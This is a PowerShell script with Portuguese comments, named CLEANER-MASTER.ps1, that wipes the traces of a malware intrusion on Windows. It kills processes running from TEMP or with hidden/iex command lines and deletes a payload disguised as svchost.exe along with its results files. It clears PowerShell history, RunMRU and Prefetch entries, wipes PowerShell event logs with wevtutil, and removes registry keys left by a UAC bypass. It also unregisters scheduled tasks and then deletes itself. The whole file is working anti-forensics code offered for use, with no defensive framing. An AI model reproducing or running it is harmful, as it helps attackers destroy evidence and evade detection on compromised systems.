<#
.SYNOPSIS
    CLEANER-MASTER.ps1 – Remove todos os rastros dos payloads.
    Executado com privilégios de administrador, encerra processos,
    apaga arquivos temporários, limpa logs e histórico, e se autodestrói.
#>

# ===== CONFIGURAÇÕES =====
$tempDir      = $env:TEMP
$payloadName  = "svchost.exe"                    # Nome furtivo do executável
$resultsDir   = Join-Path $tempDir "results"     # Pasta de resultados
$flagFile     = Join-Path $tempDir "END_ALL.txt" # Flag da distração (se existir)

# ===== 1. ENCERRAR PROCESSOS SUSPEITOS =====
Write-Host "[CLEANER] Encerrando processos..."
$processNames = @("svchost", "powershell", "cmd", "mshta", "wscript", "cscript")
foreach ($procName in $processNames) {
    Get-Process -Name $procName -ErrorAction SilentlyContinue | ForEach-Object {
        $procPath = (Get-CimInstance Win32_Process -Filter "ProcessId = $($_.Id)").ExecutablePath
        $cmdLine  = (Get-CimInstance Win32_Process -Filter "ProcessId = $($_.Id)").CommandLine
        # Mata apenas processos rodando do TEMP ou com características de payload (Hidden, iex)
        if ($procPath -like "*$tempDir*" -or $cmdLine -like "*Hidden*" -or $cmdLine -like "*iex*") {
            Write-Host "[CLEANER] Matando $($_.Name) (PID $($_.Id)): $procPath"
            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
        }
    }
}

# ===== 2. REMOVER ARQUIVOS E PASTAS =====
Write-Host "[CLEANER] Removendo arquivos..."
$pathsToDelete = @(
    Join-Path $tempDir $payloadName,
    $resultsDir,
    $flagFile,
    "$tempDir\*.zip",
    "$tempDir\*.ps1",
    "$tempDir\*.exe",
    "$env:LOCALAPPDATA\Temp\*",
    "$env:WINDIR\Temp\*"
)

foreach ($path in $pathsToDelete) {
    if (Test-Path $path) {
        Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "[CLEANER] Removido: $path"
    }
}

# ===== 3. LIMPAR HISTÓRICO DO POWERSHELL =====
Write-Host "[CLEANER] Limpando histórico do PowerShell..."
$psHistoryPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $psHistoryPath) {
    Clear-Content $psHistoryPath -Force
    Write-Host "[CLEANER] Histórico PSReadLine limpo."
}

# Remove variáveis de ambiente que possam conter comandos
Remove-Item Env:\PSExecutionPolicyPreference -ErrorAction SilentlyContinue

# ===== 4. LIMPAR REGISTROS DO SISTEMA =====
Write-Host "[CLEANER] Limpando registros..."
# RunMRU (histórico do Executar)
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue

# Prefetch (requer admin)
if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Get-ChildItem "$env:SystemRoot\Prefetch" -Filter "*.pf" | Where-Object {
        $_.Name -like "*SVCHOST*" -or $_.Name -like "*POWERSHELL*" -or $_.Name -like "*CMD*"
    } | Remove-Item -Force -ErrorAction SilentlyContinue
    Write-Host "[CLEANER] Arquivos Prefetch removidos."
}

# ===== 5. LIMPAR LOGS DE EVENTOS =====
if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $logNames = @("Windows PowerShell", "Microsoft-Windows-PowerShell/Operational")
    foreach ($log in $logNames) {
        try {
            wevtutil cl $log 2>$null
            Write-Host "[CLEANER] Log '$log' limpo."
        } catch { }
    }
}

# ===== 6. REMOVER CHAVES DE REGISTRO DO BYPASS UAC =====
$regPaths = @(
    "HKCU:\Software\Classes\ms-settings",
    "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
)
foreach ($rp in $regPaths) {
    if (Test-Path $rp) {
        Remove-Item $rp -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "[CLEANER] Chave de registro removida: $rp"
    }
}

# ===== 7. LIMPAR CACHES DE REDE =====
Write-Host "[CLEANER] Limpando caches de rede..."
ipconfig /flushdns | Out-Null
arp -d * | Out-Null

# ===== 8. REMOVER TAREFAS AGENDADAS SUSPEITAS =====
Get-ScheduledTask | Where-Object { $_.TaskPath -like "*TEMP*" -or $_.TaskName -like "*cleaner*" -or $_.TaskName -like "*payload*" } | ForEach-Object {
    Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
    Write-Host "[CLEANER] Tarefa agendada removida: $($_.TaskName)"
}

# ===== 9. AUTO-REMOÇÃO DO PRÓPRIO SCRIPT =====
$scriptPath = $MyInvocation.MyCommand.Path
if ($scriptPath) {
    Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
    Write-Host "[CLEANER] Script auto-removido."
}

# ===== 10. ENCERRAMENTO FORÇADO DO POWERSHELL =====
[GC]::Collect()
[GC]::WaitForPendingFinalizers()
Write-Host "[CLEANER] Limpeza concluída. Fechando..."
Stop-Process -Id $PID -Force
